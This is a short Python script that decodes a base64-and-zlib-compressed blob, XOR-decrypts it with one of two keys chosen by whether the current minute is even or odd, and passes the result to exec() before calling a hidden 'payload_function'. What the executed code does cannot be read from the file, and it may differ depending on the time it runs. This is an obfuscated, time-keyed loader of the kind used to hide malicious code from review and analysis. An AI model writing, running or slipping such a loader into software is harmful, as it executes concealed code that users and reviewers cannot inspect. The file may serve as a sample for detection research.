import base64
import time
import zlib


PAYLOAD = 'eNqzf3r41fxSB6M3J1euLfTkf3p/56wScd/NSz7fsE1ifnn922RHDfZnt/YtdFeUe3ZtU5JzsuDOWXt1hV2Cd8w9pM5TGPZp2dE0L6vA/69O6PCXCxxZcbhIJqG05eU5Y4naRe1vLppJCz05vGeiZQbTkxvbN+UZc/6c8X1zoYnMrwM/JoSbSGy8t6vMIYvr6Zn9+RyK4j9vT83jrKzfNf+IJl9xxN5lffWu5qKHF5wyEsksaX5x1ki8ZmHbonmF8epLprw7LCTrtLzn4zXrBKFHx3bMsdNie3l9/R3ZNPavtz/N4y1O2TzjrxJ7TuC22QdUudSEdt7fkehsJvRkzjEt3lKJI2vbs8IUFGacPWMoVr2g9dV5E8m6xR1vL5lHcHy9v3F2ZZTLosmfT4onua+Z+O02Q6rX+ik/p/vqcLya/t2Grapq66z/Kpx5wTvOtxdHKkvsXtJTGW0q/nfZI3ah8pjGLX3JDmbcLV/OVUcavD+3aJpnPOe3e+tmVUV7r5rz6JhOQdjKOV9v6JdE7G96cZ/b12fjtN8F4cqMDyb+8c5ksL/3aZkKewH7/zMTU6OqivY+Oq4jWBbd8PSUvkhlHMz/ry+YStUv6Xx32QLmf9dV/V9u2iV7rJ30/Q5jmveGqb/us2T6Ifs/P2TnvMMavEXhex4e0xYojdr/5KSecEVs03N0/8s4Luv+cNVK3mVlHyj+kfx/jznDd9P0P4ps2QEw/0Pif/eDo1r8JZH7Hp/QBfn/2WkD0ap45Ph3WNr1/oqlnPOK3k/XbRLdVk/4ess+xXPd5B93mdJB/ldgzfLfMvOfMkdu0PY5B9W4C0Jh8U+G/wGG5WiL'
KEY_A = 'W4Clyu8UOV6DqM3yFzxhhqvQ9Ro/ZImu0/gdQmeMsdb7IEVqj7TZ/iNIbZK33AEmS3CVut8EKU5zmL3iByxRdpvA5QovVHmew+gNMld8ocbrEDVaf6TJ7hM4XYKnzPEWO2CFqs/0GT5jiK3S9xxBZouw1fofRGmOs9j9IkdskbbbACVKb5S53gMoTXKXvOEGK1B1mr/kCS5TeJ3C5wwxVnugxeoPNFl+o8jtEjdcgabL8BU6X4SpzvMYPWKHrNH2G0Bliq/U+R5DaI2y1/whRmuQtdr/JEluk7jdAidMcZa74AUqT3SZvuMILVJ3nMHmCzBVep/E6Q4zWH2ix+wRNluApcrvFDleg6jN8hc8YYar0PUaP2SJrtP4HUJnjLHW+yBFao+02f4jSG2St9wBJktwlbrfBClOc5i94gcsUXabwOUKL1R5nsPoDTJXfKHG6xA1Wn+kye4TOF2Cp8zxFjtgharP9Bk+Y4it0vccQWaLsNX6H0RpjrPY/SJHbJG22wAlSm+Uud4DKE1yl7zhBitQdZq/5AkuU3idwucMMVZ7oMXqDzRZfqPI7RI3XIGmy/AVOl+Eqc7zGD1ih6zR9htAZYqv1PkeQ2iNstf8IUZrkLXa/yRJbpO43QInTHGWu+AFKk90mb7jCC1Sd5zB5gswVXqfxOkOM1h9osfsETZbgKXK7xQ5XoOozfIXPGGGq9D1Gj9kia7T+B1CZ4yx1vsgRWqPtNn+I0htkrfcASZLcJW63wQpTnOYveIHLFF2m8DlCi9UeZ7D6A0yV3yhxusQNVp/pMnuEzhdgqfM8RY7YIWqz/QZPmOIrdL3HEFmi7DV+h9EaY6z2P0iR2yRttsAJUpvlLneAyhNcpe84QYrUHWav+QJLlN4ncLnDDFWe6DF6g80WX6jyO0SN1yBpsvwFTpfhKnO8xg9Yoes0fYbQGWKr9T5HkNojbLX/A=='
KEY_B = 'W4Clyu8UOV6DqM3yFzxhhqvQ9Ro/ZImu0/gdQmeMsdb0JEZilLvKxBhRbI+71xFrD3jU88kQInRjkafIByxRdtKG5UYjXHGTg6VFe1cs5Jr5eDxAVaTJ7hM4XYKnzKNTb2eWrZzKZGIixPiXkk4TKYrxksUUFCHam6ziIlFFkfSaXiwDZ4y4n0QoED7z+7VOKVlfmr+3QGsFPeaW0194F1OizLlXHklUo8jtEjdc0u/H6BQEFvm00+NUfC7U6fv2G0AywuaYvFBfa4uy3fwgRjX/+9K+LVNEk7iKSm4ANJb1tUhoQ2CZ9ZgPNltwge7mFjBVdK3A7h5sKgC47ewRNluApcrvFHAYg/uEt0E9U5uq3PkcKBmYmdPpN0JnjLHW+yBFao+02bcgWWSe/odQY1pHlfSKSWsLIZjlpx0sTnre1oZZexU33YbCJzJXfKGUrkNgQWPtmKtbNEWDusvmJTopyuOO9hM2It6m6OYMUHaJvNX4D1R4n6LI/yttbJG2iBkyVWS7/IknHWlPspf7BDpQQZ6g4gBQWlKdwucMMVZ7oMXqDzRZfqPI7RJ6Cc3ygqBZf1+PtM69TXAgwv779htAZYqv1PkeQ2iN/IKxYwM5kL7H/zVjbpO43QInTHHG6alIbxx0hL6YdQdSd5zB5gswVSzeiLxLM0V9sO3sETZbgKXK70NxF8/tzaRWcDTDq8zoGnMtxOeH4jdCZ4yx1vsgRWqPtNm3ZUg+2/KKRF0dMdnvmnkzZHOYveIHLFF2m8DlCi9UeZ6TukR/Ei+vh7tAcBQ7rJ+vX20Yi43M8RY7YIWqz/QZPmPe7J6iWUFtlrDE0B9EaY6z2P0iFSnF44lOJRo93fSbUAJncpe84VZ5GTjf7OQULhQ904e1TWUTBPCXo0JxCnay2P0bHVyBpsugR3MR0KHMg2pUD+Lf0/obDCDEp4SrVw4t3rve1g=='


def manual_bit_length(value: int) -> int:
    if value < 0:
        value = -value
    if value == 0:
        return 0
    bits = 0
    while value:
        value = value >> 1
        bits += 1
    return bits


def manual_xor_bytes(data: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("Key must not be empty")
    result = bytearray()
    key_len = len(key)
    _ = manual_bit_length(key_len)
    index = 0
    data_len = len(data)
    while index < data_len:
        db = data[index]
        kb = key[index % key_len]
        and_part = db & kb
        or_part = db | kb
        xor_byte = or_part & (~and_part & 0xFF)
        result.append(xor_byte)
        index += 1
    return bytes(result)


def _decrypt_source_for_minute(minute: int) -> str:
    compressed = base64.b64decode(PAYLOAD)
    base_bytes = zlib.decompress(compressed)
    _ = manual_bit_length(len(base_bytes) * 8)
    if minute % 2 == 0:
        key_b64 = KEY_A
    else:
        key_b64 = KEY_B
    key_bytes = base64.b64decode(key_b64)
    decrypted = manual_xor_bytes(base_bytes, key_bytes)
    return decrypted.decode("utf-8")


def main():
    print(PAYLOAD)
    current_minute = time.localtime().tm_min
    source = _decrypt_source_for_minute(current_minute)
    namespace = {}
    exec(source, namespace)
    func = namespace.get("payload_function")
    if callable(func):
        func()


if __name__ == "__main__":
    main()


